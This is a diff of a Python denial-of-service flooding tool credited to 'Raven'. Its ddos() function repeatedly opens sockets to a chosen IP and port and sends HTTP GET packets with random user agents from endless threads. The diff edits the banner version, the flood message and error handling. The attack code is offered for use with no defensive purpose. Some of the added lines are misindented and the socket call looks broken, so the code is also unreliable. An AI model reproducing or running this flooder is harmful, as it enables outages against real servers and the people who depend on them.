@@ -48,7 +48,7 @@ def banner():
     print('   ##    ##    ##  ##     ## ##    ## ##     ##') 
     print('   ##    ##     ## ##     ##  ######  ##     ##\n')
     print(Fore.WHITE + "[*] Coded by: Raven")
-    print("[*] Version: 1.1\n" + Fore.LIGHTWHITE_EX + "")
+    print("[*] Version: 1.0\n" + Fore.LIGHTWHITE_EX + "")
 
 def main():
     banner()
@@ -106,8 +106,8 @@ def ddos():
                     try:
                         soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         packet = "GET / HTTP/1.1\n Host: " + ip + "\n\n User-Agent:" + random.choice(user_agent())
-                        print (Fore.LIGHTGREEN_EX + f"[+] Flooding {ip} @ {port}")
                         soc.connect((ip, int(portt)))
+                        print (Fore.LIGHTGREEN_EX + f"[+] Flooding {ip} @ {port}")
                         soc.sendto(packet, (ip, int(portt)))
                     except:
                         print(Fore.LIGHTRED_EX + f"[-] Error while sending a packet! {ip} might be down!")
@@ -115,8 +115,13 @@ def ddos():
                         pass
         print(Fore.LIGHTGREEN_EX + f"[+] Flooding {ip} @ {port}")
         while True:
-            th1 = Socks()
-            th1.start()
+            try:
+                th1 = Socks()
+                th1.start()
+            except:
+                print(Fore.LIGHTRED_EX + f"[-] Error while sending a packet! {ip} might be down!")
+                    time.sleep(1)
+                    pass
 
     if (method == 'udp'.lower()):
         banner()
